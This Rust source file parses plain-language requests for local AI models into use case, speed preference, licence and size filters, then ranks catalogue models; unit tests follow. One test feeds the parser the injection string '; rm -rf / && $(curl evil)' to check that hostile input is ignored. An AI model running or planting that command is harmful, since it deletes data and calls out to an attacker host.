//! Natural-language model requests → structured intent.
//! Deliberately rule-based and side-effect free: the output only *filters and
//! ranks* catalogue entries. It can never trigger an install or run anything;
//! the user still approves every install in the normal dialog.

use crate::catalog::Catalog;
use crate::recommend::{self, Budget, Recommendation, Tier};
use serde::Serialize;

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum Preference {
    /// Smallest/fastest that does the job.
    Fast,
    /// Most capable that still runs well.
    Best,
    Balanced,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct Intent {
    pub use_case: Option<String>,
    pub preference: Preference,
    pub commercial_use_required: bool,
    pub max_size_bytes: Option<u64>,
    /// Catalogue model ids mentioned by name (e.g. "llama", "gemma").
    pub mentioned_models: Vec<String>,
    /// Human-readable summary of what we understood.
    pub understood: Vec<String>,
}

const USE_CASE_KEYWORDS: &[(&str, &[&str])] = &[
    ("coding", &["code", "coding", "program", "programming", "developer", "python", "javascript", "rust", "debug", "script"]),
    ("vision", &["image", "images", "photo", "photos", "picture", "pictures", "vision", "screenshot", "see"]),
    ("reasoning", &["math", "maths", "reason", "reasoning", "logic", "think", "thinking", "solve", "puzzle", "homework"]),
    ("writing", &["write", "writing", "essay", "email", "emails", "story", "stories", "blog", "creative"]),
    ("summarization", &["summarize", "summarise", "summary", "summaries", "tldr"]),
    ("multilingual", &["translate", "translation", "language", "languages", "multilingual", "spanish", "hindi", "french", "chinese", "german"]),
    ("embeddings", &["embedding", "embeddings", "rag", "semantic search", "vector"]),
    ("chat", &["chat", "assistant", "talk", "conversation", "general", "questions"]),
];

fn words(s: &str) -> Vec<String> {
    s.to_lowercase()
        .split(|c: char| !c.is_alphanumeric() && c != '.')
        .filter(|w| !w.is_empty())
        .map(|w| w.trim_end_matches('.').to_string())
        .collect()
}

fn has(ws: &[String], text: &str, kw: &str) -> bool {
    if kw.contains(' ') { text.contains(kw) } else { ws.iter().any(|w| w == kw) }
}

/// Parse "under 4 GB" / "less than 2gb" / "max 8 gb".
fn parse_max_size(text: &str) -> Option<u64> {
    let t = text.to_lowercase().replace("gb", " gb ");
    let ws: Vec<&str> = t.split_whitespace().collect();
    for i in 0..ws.len() {
        if ws[i] == "gb" && i > 0 {
            if let Ok(n) = ws[i - 1].parse::<f64>() {
                let ctx = ws[i.saturating_sub(4)..i - 1].join(" ");
                if ["under", "less", "below", "max", "maximum", "smaller", "within", "up to", "at most"].iter().any(|k| ctx.contains(k)) {
                    return Some((n * 1024.0 * 1024.0 * 1024.0) as u64);
                }
            }
        }
    }
    None
}

pub fn parse(text: &str, catalog: &Catalog) -> Intent {
    let lower = text.to_lowercase();
    let ws = words(text);
    let mut understood = Vec::new();

    // Highest-priority use case = first in USE_CASE_KEYWORDS order that matches.
    let use_case = USE_CASE_KEYWORDS
        .iter()
        .find(|(_, kws)| kws.iter().any(|k| has(&ws, &lower, k)))
        .map(|(u, _)| u.to_string());
    if let Some(u) = &use_case {
        understood.push(format!("Use: {u}"));
    }

    let fast = ["fast", "quick", "small", "tiny", "light", "lightweight", "laptop", "old", "slow", "weak", "speed"]
        .iter()
        .any(|k| has(&ws, &lower, k));
    let best = ["best", "smartest", "powerful", "capable", "accurate", "largest", "biggest", "quality", "strongest"]
        .iter()
        .any(|k| has(&ws, &lower, k));
    let preference = match (fast, best) {
        (true, false) => Preference::Fast,
        (false, true) => Preference::Best,
        _ => Preference::Balanced,
    };
    match preference {
        Preference::Fast => understood.push("Prefers small and fast".into()),
        Preference::Best => understood.push("Prefers most capable".into()),
        Preference::Balanced => {}
    }

    let commercial_use_required = ["commercial", "business", "company", "work", "client", "clients", "sell", "product"]
        .iter()
        .any(|k| has(&ws, &lower, k));
    if commercial_use_required {
        understood.push("Needs a licence that allows commercial use".into());
    }

    let max_size_bytes = parse_max_size(text);
    if let Some(m) = max_size_bytes {
        understood.push(format!("Download under {:.1} GB", m as f64 / (1u64 << 30) as f64));
    }

    let mentioned_models: Vec<String> = catalog
        .models
        .iter()
        .filter(|m| {
            let base: String = m.id.chars().take_while(|c| c.is_alphabetic()).collect();
            base.len() >= 3 && ws.iter().any(|w| w.starts_with(&base))
        })
        .map(|m| m.id.clone())
        .collect();
    if !mentioned_models.is_empty() {
        understood.push(format!("Mentioned: {}", mentioned_models.join(", ")));
    }

    Intent { use_case, preference, commercial_use_required, max_size_bytes, mentioned_models, understood }
}

/// Apply an intent to the catalogue for this machine.
pub fn recommend_for(intent: &Intent, catalog: &Catalog, b: &Budget) -> Vec<Recommendation> {
    // Filter the catalogue first, then reuse the standard recommender.
    let mut filtered = catalog.clone();
    filtered.models.retain(|m| {
        (intent.mentioned_models.is_empty() || intent.mentioned_models.contains(&m.id))
            && (!intent.commercial_use_required || m.license.commercial_use == "yes")
    });
    for m in &mut filtered.models {
        m.variants.retain(|v| {
            intent.max_size_bytes.map_or(true, |max| v.approx_size_bytes <= max)
                && (!intent.commercial_use_required
                    || v.license.as_ref().map_or(true, |l| l.commercial_use == "yes"))
        });
    }
    filtered.models.retain(|m| !m.variants.is_empty());

    let mut recs = recommend::recommend(&filtered, b, intent.use_case.as_deref());
    // A mentioned model that isn't tagged with the inferred use case is still wanted.
    if recs.is_empty() && intent.use_case.is_some() && !intent.mentioned_models.is_empty() {
        recs = recommend::recommend(&filtered, b, None);
    }

    match intent.preference {
        Preference::Fast => {
            // For "fast", pick the smallest variant that runs well per model.
            for r in &mut recs {
                if let Some(m) = filtered.models.iter().find(|m| m.id == r.model_id) {
                    if let Some(v) = m
                        .variants
                        .iter()
                        .filter(|v| recommend::assess(v, b).tier >= Tier::Good)
                        .min_by(|a, b| a.params_b.partial_cmp(&b.params_b).unwrap_or(std::cmp::Ordering::Equal))
                    {
                        r.compatibility = recommend::assess(v, b);
                        r.variant = v.clone();
                    }
                }
            }
            recs.sort_by(|a, b| a.variant.approx_size_bytes.cmp(&b.variant.approx_size_bytes));
        }
        Preference::Best | Preference::Balanced => {}
    }
    recs
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::catalog::curated;

    const GIB: u64 = 1 << 30;

    fn budget() -> Budget {
        Budget { total_ram: 16 * GIB, available_ram: 8 * GIB, vram: 8 * GIB, disk_free: Some(200 * GIB), avx2: true }
    }

    #[test]
    fn coding_on_laptop() {
        let i = parse("I want a small model to help me write Python code on my laptop", curated());
        assert_eq!(i.use_case.as_deref(), Some("coding"));
        assert_eq!(i.preference, Preference::Fast);
    }

    #[test]
    fn best_for_images_commercial() {
        let i = parse("Best model to describe photos for my business", curated());
        assert_eq!(i.use_case.as_deref(), Some("vision"));
        assert_eq!(i.preference, Preference::Best);
        assert!(i.commercial_use_required);
    }

    #[test]
    fn size_limit() {
        let i = parse("a chat model under 3 GB", curated());
        assert_eq!(i.max_size_bytes, Some(3 * GIB));
        let r = recommend_for(&i, curated(), &budget());
        assert!(!r.is_empty());
        assert!(r.iter().all(|x| x.variant.approx_size_bytes <= 3 * GIB));
    }

    #[test]
    fn mentioned_model() {
        let i = parse("can I run gemma?", curated());
        assert_eq!(i.mentioned_models, vec!["gemma3".to_string()]);
        let r = recommend_for(&i, curated(), &budget());
        assert!(r.iter().all(|x| x.model_id == "gemma3"));
    }

    #[test]
    fn commercial_filter_excludes_conditional_licences() {
        let i = parse("chat assistant for my company", curated());
        let r = recommend_for(&i, curated(), &budget());
        assert!(!r.is_empty());
        assert!(r.iter().all(|x| x.model_id != "llama3.2" && x.model_id != "gemma3"));
    }

    #[test]
    fn fast_prefers_small_variants() {
        let i = parse("something quick for coding", curated());
        let r = recommend_for(&i, curated(), &budget());
        let coder = r.iter().find(|x| x.model_id == "qwen2.5-coder").unwrap();
        assert_eq!(coder.variant.tag, "qwen2.5-coder:1.5b");
    }

    #[test]
    fn gibberish_is_harmless() {
        let i = parse("; rm -rf / && $(curl evil)", curated());
        assert!(i.use_case.is_none());
        assert!(i.mentioned_models.is_empty());
    }
}
